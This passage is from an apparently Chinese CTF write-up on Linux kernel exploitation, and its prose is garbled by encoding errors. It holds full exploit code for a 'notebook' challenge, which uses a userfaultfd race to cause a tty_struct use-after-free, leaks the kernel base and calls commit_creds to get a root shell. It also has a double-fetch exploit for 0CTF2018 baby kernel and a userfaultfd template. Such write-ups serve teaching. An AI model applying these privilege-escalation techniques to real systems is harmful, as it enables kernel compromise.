class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx  find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;ioctl=work_for_cpu_fn-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">size_t</span> cred=fake_tty_struct[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root_cred: %p\n&quot;</span>,cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>,fake_tty_struct[<span class="number">4</span>]);</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=cred;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒçœ‹åˆ«äººåšå®¢æ˜¯ç¨³å®šæ€§æ›´å¥½ï¼Œä½†æ˜¯æˆ‘è·‘å¥½å‡ æ¬¡æ‰èƒ½æˆåŠŸä¸€æ¬¡ï¼Œè¿œæ²¡æœ‰è§£æ³•ä¸€æ¥çš„ç¨³å®šï¼Œæƒ³æ·±ç©¶å°±å¾—å—¯è°ƒï¼ˆä¸çŸ¥é“ä»£ç åœ¨å“ªï¼‰ï¼Œå“ã€‚</p>
<p>è¿™é“é¢˜debugäº†å¿«ä¸¤å¤©ï¼Œå…¶ä¸­æ¯”è¾ƒå‘çš„æ˜¯å°±æ˜¯å…³äº<code>tty_struct</code>å’Œ<code>tty_operations</code>çš„ä¼ªé€ äº†ï¼Œ<code>tty_struct</code>å¦‚æœä¼ªé€ çš„æœ‰é—®é¢˜çš„è¯å°±ä¼šç›´æ¥å¼•èµ·kernel painc,æ‰€ä»¥å¾—<code>memcpy(fake_tty_struct,tty_struct,0x50)</code>ç„¶åå†ä¼ªé€ æˆåŠŸç‡é«˜ä¸€äº›ï¼ˆå…³é”®æ˜¯æ‰¾ä¸åˆ°è¿™å—çš„æºç åœ¨å“ªï¼Œä¸èƒ½çœ‹ä»£ç åˆ†æï¼Œåªèƒ½å—¯è°ƒï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼‰ã€‚ç„¶åæ˜¯å…³äº<code>tty_operation</code>çš„ä¼ªé€ ï¼Œæœ¬æ¥çš„æƒ³æ³•æ˜¯ç›´æ¥åœ¨<code>tty_operation</code>ä¸Šæ„é€ å¥½å®Œæ•´çš„ropæ‰§è¡Œå¾—äº†ï¼Œä½†æ˜¯ä¸€æ—¦åœ¨<code>write</code>æŒ‡é’ˆåé¢å†™ä¸œè¥¿çš„è¯å°±ä¼šå´©æ‰ã€‚æœ€åä¹Ÿåªèƒ½è·³åˆ°ä¸€ä¸ªå †ä¸Šå†æ‰§è¡Œropäº†ã€‚å…³é”®è¿˜æ˜¯è‡ªå·±å¯¹å†…æ ¸ä¸ç†Ÿæ‚‰ï¼Œå°±ç®—æƒ³çœ‹ä»£ç éƒ½ä¸çŸ¥é“åœ¨å“ªï¼Œéå¸¸æŠ˜ç£¨äººï¼Œå­¦å®Œå†…æ ¸åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†ç‚¹ä¹‹åå¾—èµ¶ç´§æŠŠå†…æ ¸å­¦ä¹ å’Œå†…æ ¸ä»£ç é˜…è¯»æä¸Šæ—¥ç¨‹äº†ã€‚</p>
<p><strong>æ€»ç»“</strong>:é€šè¿‡è¿™é“é¢˜çœŸçš„èƒ½æ„Ÿè§‰åˆ°å†…æ ¸åˆ©ç”¨ä¸­åŒæ­¥å¼•å‘çš„æ¡ä»¶ç«äº‰çš„é­…åŠ›ï¼Œä»£ç çœ‹ç€å®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯é€šè¿‡é˜»å¡å°±èƒ½ç¡¬ç”Ÿç”Ÿæ„é€ å‡ºä¸€ä¸ªuaf,æ­»é«˜ä¸€ï¼Œä»¥ååœ¨æ¼æ´åˆ©ç”¨çš„æ—¶å€™è¦å¤šæ³¨æ„æ³¨æ„æ¡ä»¶ç«äº‰ã€‚</p>
<h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><h3 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h3><p>å–å€¼ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡è¿›è¡Œåˆæ³•æ•ˆéªŒï¼Œç¬¬äºŒæ¬¡è¿›è¡Œæ•°æ®æ“ä½œï¼Œåœ¨è¿™ä¸¤æ¬¡ä¸­é—´å¯ä»¥é€šè¿‡å¤šçº¿ç¨‹æ”¹å˜æ•°æ®çš„å€¼ï¼Œè¿›è€Œè®©ç¬¬ä¸€æ¬¡æ•ˆéªŒå¤±æ•ˆä¼ å…¥æ¶æ„æ•°æ®ã€‚</p>
<h4 id="ä¾‹é¢˜-0CTF2018-Final-baby-kernel"><a href="#ä¾‹é¢˜-0CTF2018-Final-baby-kernel" class="headerlink" title="ä¾‹é¢˜ 0CTF2018 Final - baby kernel"></a>ä¾‹é¢˜ 0CTF2018 Final - baby kernel</h4><p>è¿™é“é¢˜ä¹‹å‰åšè¿‡ç›´æ¥æ”¾è„šæœ¬äº†</p>
<h5 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p>userfaultfdæ˜¯linuxç³»ç»Ÿåœ¨ç”¨æˆ·æ€çš„ä¸€ä¸ªç¼ºé¡µå¤„ç†æœºåˆ¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰å‡½æ•°æ¥å¤„ç†æ­¤ç±»äº‹ä»¶ï¼Œå°±åƒkvmä¸€æ ·ï¼Œlinuxç³»ç»Ÿå·²ç»è§„å®šå¥½äº†userfaultfdçš„æ¥å£ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨è§„å®šçš„æ¥å£å¯¹æŸä¸€è™šæ‹Ÿå†…å­˜è¿›è¡Œç›‘è§†ï¼Œå¹¶ä¸”å¯ä»¥æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œå½“ç›‘è§†å†…å­˜å‘ç”Ÿç¼ºé¡µå¼‚å¸¸çš„æ—¶å€™å°±ä¼šå»æ‰§è¡Œè¿™ä¸ªæ³¨å†Œå‡½æ•°ã€‚</p>
<p>ä½¿ç”¨userfaultfdçš„ä»£ç åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ç›‘æ§å¹¶æ³¨å†Œå‡½æ•°ï¼Œä¸€éƒ¨åˆ†æ˜¯è‡ªå®šä¹‰å¤„ç†å‡½æ•°çš„å®šä¹‰</p>
<p><strong>æ³¨å†Œæ¨¡æ¿</strong></p>
<p>å…¶ä¸­<code>register_userfault</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯å—ç›‘æ§å†…å­˜ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è‡ªå®šä¹‰å¤„ç†å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(err_msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> thr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">	ua.api = UFFD_API;</span><br><span class="line">	ua.features    = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">	ur.range.len   = PAGE_SIZE;</span><br><span class="line">	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        <span class="comment">//å½“å‘ç”Ÿç¼ºé¡µæ—¶ï¼Œç¨‹åºä¼šé˜»å¡ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ“ä½œ</span></span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">	<span class="comment">//å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¥æ”¶é”™è¯¯çš„ä¿¡å·ï¼Œç„¶åå¤„ç†</span></span><br><span class="line">	<span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">	<span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">		err_exit(<span 